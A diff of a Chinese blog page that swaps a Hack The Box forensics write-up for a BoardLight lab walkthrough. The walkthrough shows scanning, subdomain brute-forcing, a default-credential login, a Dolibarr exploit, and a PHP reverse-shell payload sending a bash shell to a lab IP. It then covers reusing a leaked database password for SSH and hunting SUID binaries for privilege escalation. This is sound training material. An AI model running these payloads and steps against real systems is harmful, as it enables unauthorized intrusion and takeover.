@@ -14,7 +14,7 @@
 
 <html lang="zh-cn"><head>
     <meta charset="utf-8" />
-    <title>Meerkat | 遥乡书屋</title>
+    <title>BoardLight | 遥乡书屋</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="M1st0ry's blog" />
     <meta name="keywords" content="Documentation, CTF, HTB, M1st0ry" />
@@ -30,14 +30,28 @@
 <link rel="icon" type="image/png" sizes="32x32" href="https://c0ld1nk.github.io/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="https://c0ld1nk.github.io/favicon-16x16.png">
 <link rel="manifest" crossorigin="use-credentials" href="https://c0ld1nk.github.io/site.webmanifest">
-<meta property="og:title" content="Meerkat" />
-<meta property="og:description" content="解压密码为hacktheblue
+<meta property="og:title" content="BoardLight" />
+<meta property="og:description" content="信息搜集 linkip：10.10.11.11
+nmap：
 
-作为一家快速发展的初创公司，Forela 一直在使用业务管理平台。遗憾的是，我们的文档匮乏，且管理员的安全意识较为薄弱。作为新任安全服务提供商，我们希望您能查看我们导出的部分 PCAP 和日志数据，以确认我们是否遭受（或未遭受）入侵。
-Task1 link
-我们怀疑业务管理平台服务器可能已遭入侵。请确认当前运行的应用程序名称？
-Bonitasoft
-wireshark-统计-端点-TCP-按照流量包大小排序
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  nmap -T4 -A -v ip
+  
+  
 
 
 
@@ -47,27 +61,8 @@ wireshark-统计-端点-TCP-按照流量包大小排序
     
   
 
-能看见一个外部地址发包最多，其次是内网地址的三个端口，猜测第一个为攻击者ip，8080为服务端口，过滤此端口
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  ip.dst==172.31.6.44 &amp;&amp; tcp.port==8080
-  
-  
-找到访问记录；
+访问80端口
+除了一个邮箱域名没有别的发现
 
 
 
@@ -77,7 +72,26 @@ wireshark-统计-端点-TCP-按照流量包大小排序
     
   
 
-搜索得知软件名称
+将ip和域名添加到hosts文件里，爆破一下子域名
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  gobuster vhost -u http://board.htb --append-domain -w C:\Users\Administrator\Desktop\Dictionary-Of-Pentesting-master\Subdomain\wydomain_top3000.txt
+  
+  
 
 
 
@@ -87,66 +101,39 @@ wireshark-统计-端点-TCP-按照流量包大小排序
     
   
 
-Task2 link
-我们相信攻击者可能使用了暴力破解攻击类别的一个子集——所进行的攻击名称是什么？
-Credential Stuffing
-按照info和time排序，找到爆破行为：
+将这个也添加到hosts文件
+访问发现是登录界面，尝试弱口令
 
-
-
-
-
-  
-    
-  
-
-查看
-
-
-
-
-
-  
-    
-  
-
-
-
-
-
-
-  
-    
-  
-
-不像是暴力，更像是撞库
-Task3 link
-被利用的漏洞是否分配有 CVE 编号？如果有，是哪一个？
-CVE-2022-25237
-能看见访问了这个路由
-
-
-
-
-
-  
-    
-  
-
-搜索得到编号，CVE-2022-25237" />
+admin:admin
+搜索dolibarr 17.0.0的漏洞，找到CVE-2023-30253
+https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://c0ld1nk.github.io/docs/htb/sherlock/meerkat/" /><meta property="og:image" content="https://c0ld1nk.github.io/opengraph/card-base-2_hu_ae28904cb08dd856.png"/><meta property="article:section" content="docs" />
-<meta property="article:published_time" content="2025-05-30T15:10:35+08:00" />
-<meta property="article:modified_time" content="2025-05-30T15:10:35+08:00" /><meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://c0ld1nk.github.io/opengraph/card-base-2_hu_ae28904cb08dd856.png"/>
-<meta name="twitter:title" content="Meerkat"/>
-<meta name="twitter:description" content="解压密码为hacktheblue
+<meta property="og:url" content="https://c0ld1nk.github.io/docs/htb/%E9%9D%B6%E5%9C%BA/boardlight/" /><meta property="og:image" content="https://c0ld1nk.github.io/opengraph/card-base-2_hu_579693861252aa11.png"/><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2025-05-31T20:00:16+08:00" />
+<meta property="article:modified_time" content="2025-05-31T20:00:16+08:00" /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://c0ld1nk.github.io/opengraph/card-base-2_hu_579693861252aa11.png"/>
+<meta name="twitter:title" content="BoardLight"/>
+<meta name="twitter:description" content="信息搜集 linkip：10.10.11.11
+nmap：
 
-作为一家快速发展的初创公司，Forela 一直在使用业务管理平台。遗憾的是，我们的文档匮乏，且管理员的安全意识较为薄弱。作为新任安全服务提供商，我们希望您能查看我们导出的部分 PCAP 和日志数据，以确认我们是否遭受（或未遭受）入侵。
-Task1 link
-我们怀疑业务管理平台服务器可能已遭入侵。请确认当前运行的应用程序名称？
-Bonitasoft
-wireshark-统计-端点-TCP-按照流量包大小排序
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  nmap -T4 -A -v ip
+  
+  
 
 
 
@@ -156,27 +143,8 @@ wireshark-统计-端点-TCP-按照流量包大小排序
     
   
 
-能看见一个外部地址发包最多，其次是内网地址的三个端口，猜测第一个为攻击者ip，8080为服务端口，过滤此端口
-
-
-
-  
-  
-  
-
-  
-  
-  
-  
-
-  
-
-  
-  
-  ip.dst==172.31.6.44 &amp;&amp; tcp.port==8080
-  
-  
-找到访问记录；
+访问80端口
+除了一个邮箱域名没有别的发现
 
 
 
@@ -186,7 +154,26 @@ wireshark-统计-端点-TCP-按照流量包大小排序
     
   
 
-搜索得知软件名称
+将ip和域名添加到hosts文件里，爆破一下子域名
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  gobuster vhost -u http://board.htb --append-domain -w C:\Users\Administrator\Desktop\Dictionary-Of-Pentesting-master\Subdomain\wydomain_top3000.txt
+  
+  
 
 
 
@@ -196,53 +183,12 @@ wireshark-统计-端点-TCP-按照流量包大小排序
     
   
 
-Task2 link
-我们相信攻击者可能使用了暴力破解攻击类别的一个子集——所进行的攻击名称是什么？
-Credential Stuffing
-按照info和time排序，找到爆破行为：
+将这个也添加到hosts文件
+访问发现是登录界面，尝试弱口令
 
-
-
-
-
-  
-    
-  
-
-查看
-
-
-
-
-
-  
-    
-  
-
-
-
-
-
-
-  
-    
-  
-
-不像是暴力，更像是撞库
-Task3 link
-被利用的漏洞是否分配有 CVE 编号？如果有，是哪一个？
-CVE-2022-25237
-能看见访问了这个路由
-
-
-
-
-
-  
-    
-  
-
-搜索得到编号，CVE-2022-25237"/>
+admin:admin
+搜索dolibarr 17.0.0的漏洞，找到CVE-2023-30253
+https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253"/>
 
     
         <link rel="alternate" type="application/atom+xml" title="Atom feed for 遥乡书屋" href="/index.xml" />
@@ -332,16 +278,16 @@ CVE-2022-25237
                                     
                                         
                                         
-                                            <li class="sidebar-dropdown nested no-icon ">
+                                            <li class="sidebar-dropdown nested no-icon current active">
                                                 <button class="btn">
                                                     靶场
                                                 </button>
-                                                <div class="sidebar-submenu ">
+                                                <div class="sidebar-submenu d-block">
                                                     <ul>
                                                         
                                                             
                                                             
-                                                                <li class=" no-icon"><a class="sidebar-nested-link" href="https://c0ld1nk.github.io/docs/htb/%E9%9D%B6%E5%9C%BA/boardlight/">BoardLight</a></li>
+                                                                <li class="current no-icon"><a class="sidebar-nested-link" href="https://c0ld1nk.github.io/docs/htb/%E9%9D%B6%E5%9C%BA/boardlight/">BoardLight</a></li>
                                                             
                                                         
                                                     </ul>
@@ -351,11 +297,11 @@ CVE-2022-25237
                                     
                                         
                                         
-                                            <li class="sidebar-dropdown nested no-icon current active">
+                                            <li class="sidebar-dropdown nested no-icon ">
                                                 <button class="btn">
                                                     Sherlock
                                                 </button>
-                                                <div class="sidebar-submenu d-block">
+                                                <div class="sidebar-submenu ">
                                                     <ul>
                                                         
                                                             
@@ -375,7 +321,7 @@ CVE-2022-25237
                                                         
                                                             
                                                             
-                                                                <li class="current no-icon"><a class="sidebar-nested-link" href="https://c0ld1nk.github.io/docs/htb/sherlock/meerkat/">Meerkat</a></li>
+                                                                <li class=" no-icon"><a class="sidebar-nested-link" href="https://c0ld1nk.github.io/docs/htb/sherlock/meerkat/">Meerkat</a></li>
                                                             
                                                         
                                                             
@@ -571,15 +517,15 @@ CVE-2022-25237
             
             
                 <li class="breadcrumb-item text-capitalize" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-                    <a itemprop="item" href="/docs/htb/sherlock/">
-                        <span itemprop="name">Sherlock</span>
+                    <a itemprop="item" href="/docs/htb/%E9%9D%B6%E5%9C%BA/">
+                        <span itemprop="name">靶场</span>
                     </a>
                     <meta itemprop="position" content='3' />
                 </li>
             
         
             <li class="breadcrumb-item text-capitalize active" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-                <span itemprop="name">Meerkat</span>
+                <span itemprop="name">BoardLight</span>
                 <meta itemprop="position" content='4' />
             </li>
         
@@ -603,7 +549,7 @@ CVE-2022-25237
                                             <div class="mb-0 d-flex">
                                                 
                                                 <h1 class="content-title mb-0">
-                                                    Meerkat
+                                                    BoardLight
                                                     
                                                 </h1>
                                             </div>
@@ -612,23 +558,82 @@ CVE-2022-25237
                                                 
     
     <div data-prismjs-copy="" data-prismjs-copy-success="" data-prismjs-copy-error="">
-        <p>解压密码为hacktheblue</p>
+        <h1 id="信息搜集">信息搜集 <a href="#%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><p>ip：10.10.11.11
+nmap：</p>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="bff3f95" class="language-bash ">
+  <code>nmap -T4 -A -v ip</code>
+  </pre>
+  </div>
+<p>
+
+
+
+
+  
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531201709370.png" alt="" loading="lazy">
+  
+</p>
+<p>访问80端口
+除了一个邮箱域名没有别的发现</p>
+<p>
+
+
+
+
+  
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531202117912.png" alt="" loading="lazy">
+  
+</p>
+<p>将ip和域名添加到hosts文件里，爆破一下子域名</p>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="59fcc59" class="language-bash ">
+  <code>gobuster vhost -u http://board.htb --append-domain -w C:\Users\Administrator\Desktop\Dictionary-Of-Pentesting-master\Subdomain\wydomain_top3000.txt</code>
+  </pre>
+  </div>
+<p>
+
+
+
+
+  
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531201140133.png" alt="" loading="lazy">
+  
+</p>
+<p>将这个也添加到hosts文件
+访问发现是登录界面，尝试弱口令</p>
 <blockquote>
-<p>作为一家快速发展的初创公司，Forela 一直在使用业务管理平台。遗憾的是，我们的文档匮乏，且管理员的安全意识较为薄弱。作为新任安全服务提供商，我们希望您能查看我们导出的部分 PCAP 和日志数据，以确认我们是否遭受（或未遭受）入侵。</p></blockquote>
-<h1 id="task1">Task1 <a href="#task1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
-<p>我们怀疑业务管理平台服务器可能已遭入侵。请确认当前运行的应用程序名称？</p>
-<p>Bonitasoft</p></blockquote>
-<p>wireshark-统计-端点-TCP-按照流量包大小排序</p>
-<p>
-
-
-
-
-  
-    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531185617390.png" alt="" loading="lazy">
-  
-</p>
-<p>能看见一个外部地址发包最多，其次是内网地址的三个端口，猜测第一个为攻击者ip，8080为服务端口，过滤此端口</p>
+<p>admin:admin</p></blockquote>
+<p>搜索dolibarr 17.0.0的漏洞，找到CVE-2023-30253
+<a href="https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253" rel="external" target="_blank">https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253<svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M14 5c-.552 0-1-.448-1-1s.448-1 1-1h6c.552 0 1 .448 1 1v6c0 .552-.448 1-1 1s-1-.448-1-1v-3.586l-7.293 7.293c-.391.39-1.024.39-1.414 0-.391-.391-.391-1.024 0-1.414l7.293-7.293h-3.586zm-9 2c-.552 0-1 .448-1 1v11c0 .552.448 1 1 1h11c.552 0 1-.448 1-1v-4.563c0-.552.448-1 1-1s1 .448 1 1v4.563c0 1.657-1.343 3-3 3h-11c-1.657 0-3-1.343-3-3v-11c0-1.657 1.343-3 3-3h4.563c.552 0 1 .448 1 1s-.448 1-1 1h-4.563z"/></svg></a></p>
 
 
 
@@ -644,94 +649,21 @@ CVE-2022-25237
   
 
   <div class="prism-codeblock ">
-  <pre id="f284b17" class="language-wireshark ">
-  <code>ip.dst==172.31.6.44 &amp;&amp; tcp.port==8080</code>
+  <pre id="82dde54" class="language-php ">
+  <code>&lt;?pHp exec(&#34;/bin/bash -c &#39;bash -i &gt; /dev/tcp/10.10.16.33/1001 0&gt;&amp;1&#39;&#34;); ?&gt;</code>
   </pre>
   </div>
-<p>找到访问记录；</p>
+<p>反弹成功</p>
 <p>
 
 
 
 
   
-    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531185706743.png" alt="" loading="lazy">
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531202144847.png" alt="" loading="lazy">
   
 </p>
-<p>搜索得知软件名称</p>
-<p>
-
-
-
-
-  
-    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531185716941.png" alt="" loading="lazy">
-  
-</p>
-<h1 id="task2">Task2 <a href="#task2" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
-<p>我们相信攻击者可能使用了暴力破解攻击类别的一个子集——所进行的攻击名称是什么？</p>
-<p>Credential Stuffing</p></blockquote>
-<p>按照info和time排序，找到爆破行为：</p>
-<p>
-
-
-
-
-  
-    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531185726750.png" alt="" loading="lazy">
-  
-</p>
-<p>查看</p>
-<p>
-
-
-
-
-  
-    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531185740848.png" alt="" loading="lazy">
-  
-</p>
-<p>
-
-
-
-
-  
-    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531185750928.png" alt="" loading="lazy">
-  
-</p>
-<p>不像是暴力，更像是撞库</p>
-<h1 id="task3">Task3 <a href="#task3" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
-<p>被利用的漏洞是否分配有 CVE 编号？如果有，是哪一个？</p>
-<p>CVE-2022-25237</p></blockquote>
-<p>能看见访问了这个路由</p>
-<p>
-
-
-
-
-  
-    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531185807718.png" alt="" loading="lazy">
-  
-</p>
-<p>搜索得到编号，<a href="https://zhuanlan.zhihu.com/p/575580483" rel="external" target="_blank">CVE-2022-25237<svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M14 5c-.552 0-1-.448-1-1s.448-1 1-1h6c.552 0 1 .448 1 1v6c0 .552-.448 1-1 1s-1-.448-1-1v-3.586l-7.293 7.293c-.391.39-1.024.39-1.414 0-.391-.391-.391-1.024 0-1.414l7.293-7.293h-3.586zm-9 2c-.552 0-1 .448-1 1v11c0 .552.448 1 1 1h11c.552 0 1-.448 1-1v-4.563c0-.552.448-1 1-1s1 .448 1 1v4.563c0 1.657-1.343 3-3 3h-11c-1.657 0-3-1.343-3-3v-11c0-1.657 1.343-3 3-3h4.563c.552 0 1 .448 1 1s-.448 1-1 1h-4.563z"/></svg></a></p>
-<p>
-
-
-
-
-  
-    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531185824076.png" alt="" loading="lazy">
-  
-</p>
-<h1 id="task4">Task4 <a href="#task4" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
-<p>攻击者的漏洞利用在 API URL 路径后附加了哪个字符串以绕过授权过滤器？</p>
-<p>i18ntranslation</p></blockquote>
-<p>参见上一问即可</p>
-<h1 id="task5">Task5 <a href="#task5" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
-<p>在凭证填充攻击中使用了多少组用户名和密码的组合？</p>
-<p>56</p></blockquote>
-<p>文件-导出分组解析结果为纯文本，用脚本提取即可</p>
+<p>生成交互式shell</p>
 
 
 
@@ -747,34 +679,11 @@ CVE-2022-25237
   
 
   <div class="prism-codeblock ">
-  <pre id="277383b" class="language-python ">
-  <code>import re
-
-def extract_usernames(filename):
-    pattern = r&#39;Form item: &#34;username&#34;\s*=\s*&#34;([^&#34;]&#43;)&#34;&#39;
-    usernames = []
-    
-    with open(filename, &#39;r&#39;, encoding=&#39;utf-8&#39;) as file:
-        for line in file:
-            match = re.search(pattern, line)
-            if match:
-                usernames.append(match.group(1))
-    
-    return usernames
-
-# 使用示例
-usernames = extract_usernames(&#39;1.txt&#39;)
-usernames = set(usernames)
-print(len(usernames))
-for i in usernames:
-	print(i)</code>
+  <pre id="4a84c7e" class="language-bash ">
+  <code>python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</code>
   </pre>
   </div>
-<p>得到结果57，但是不对，去掉默认账户<code>install:install</code>就对了</p>
-<h1 id="task6">Task6 <a href="#task6" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
-<p>哪一组用户名和密码组合成功了？</p>
-<p><code>seb.broom@forela.co.uk:g0vernm3nt</code></p></blockquote>
-<p>过滤响应码200的包</p>
+<p>搜索配置文件</p>
 
 
 
@@ -790,8 +699,34 @@ for i in usernames:
   
 
   <div class="prism-codeblock ">
-  <pre id="5e87b16" class="language-wireshark ">
-  <code>ip.addr == 172.31.6.44 &amp;&amp; tcp.port == 8080 &amp;&amp; http.response.code == 200</code>
+  <pre id="c763570" class="language-bash ">
+  <code>find / -name conf.php 2&gt;/dev/null</code>
+  </pre>
+  </div>
+<blockquote>
+<p>/var/www/html/crm.board.htb/htdocs/conf/conf.php</p></blockquote>
+<p>打开找到数据库账号密码</p>
+<blockquote>
+<p>$dolibarr_main_db_user=&lsquo;dolibarrowner&rsquo;;
+$dolibarr_main_db_pass=&lsquo;serverfun2$2023!!&rsquo;;</p></blockquote>
+<p>翻找数据库无内容。home目录下存在larissa用户，尝试ssh，密码使用数据库密码</p>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="f654824" class="language-bash ">
+  <code>ssh larissa@10.10.11.11</code>
   </pre>
   </div>
 <p>
@@ -800,51 +735,62 @@ for i in usernames:
 
 
   
-    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531185836426.png" alt="" loading="lazy">
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531202201878.png" alt="" loading="lazy">
   
 </p>
-<h1 id="task7">Task7 <a href="#task7" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
-<p>如果有的话，攻击者利用了哪个文本分享网站？</p>
-<p>pastes.io</p></blockquote>
+<p>之后提权，先sudo -l无效，查找suid文件</p>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="22690b9" class="language-bash ">
+  <code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code>
+  </pre>
+  </div>
+<p>发现使用Enlightenment，有CVE-2022-37706</p>
 <p>
 
 
 
 
   
-    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531185848151.png" alt="" loading="lazy">
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531202403943.png" alt="" loading="lazy">
   
 </p>
-<h1 id="task8">Task8 <a href="#task8" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
-<p>请提供攻击者用于在我们主机上维持持久访问的公钥文件名。</p>
-<p>hffgra4unv</p></blockquote>
-<p>题目翻译的有点问题，意思应该是用哪个文件写入的公钥
-打开上一题找到的url能看见</p>
-<p>
-
+<p>下载exp，开个python服务</p>
 
 
 
   
-    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531185902947.png" alt="" loading="lazy">
   
-</p>
-<h1 id="task9">Task9 <a href="#task9" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
-<p>你能确认攻击者为维持持久访问所修改的文件吗？</p>
-<p>/home/ubuntu/.ssh/authorized_keys</p></blockquote>
-<p>见上一题</p>
-<h1 id="task10">Task10 <a href="#task10" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><blockquote>
-<p>您能确认这种持久化机制对应的 MITRE 技术 ID 吗？</p>
-<p>T1098.004</p></blockquote>
-<p>
-
-
-
+  
 
   
-    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250531185916676.png" alt="" loading="lazy">
   
-</p>
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="98acc4a" class="language-bash ">
+  <code>python -m http.server 80</code>
+  </pre>
+  </div>
+<p>之后给执行权限，运行即可提权
+![[Pasted image 20240726115017.png]]
+或者使用LinPEAS辅助查找提权</p>
 
     </div>
 
@@ -855,22 +801,12 @@ for i in usernames:
                                             <div><hr class="doc-hr">
 <div id="doc-nav" class="d-print-none">
 
-	<div class="row flex-xl-nowrap ">
-	<div class="col-sm-6 pt-2 doc-next">
-		<a href="/docs/htb/sherlock/campfire-1/">
-			<div class="card h-100 my-1">
-				<div class="card-body py-2">
-                    <p class="card-title fs-5 fw-semibold lh-base mb-0"><i class="material-icons align-middle">navigate_before</i> Campfire-1</p>
-					
-				</div>
-			</div>
-		</a>
-        </div>
+	<div class="row flex-xl-nowrap flex-row-reverse">
 	<div class="col-sm-6 pt-2 doc-prev">
-		<a class="ms-auto" href="/docs/htb/sherlock/noxious/">
+		<a class="ms-auto" href="/docs/htb/sherlock/origins/">
 			<div class="card h-100 my-1 text-end">
 				<div class="card-body py-2">
-                    <p class="card-title fs-5 fw-semibold lh-base mb-0">Noxious <i class="material-icons align-middle">navigate_next</i></p>
+                    <p class="card-title fs-5 fw-semibold lh-base mb-0">Origins <i class="material-icons align-middle">navigate_next</i></p>
 					
 				</div>
 			</div>
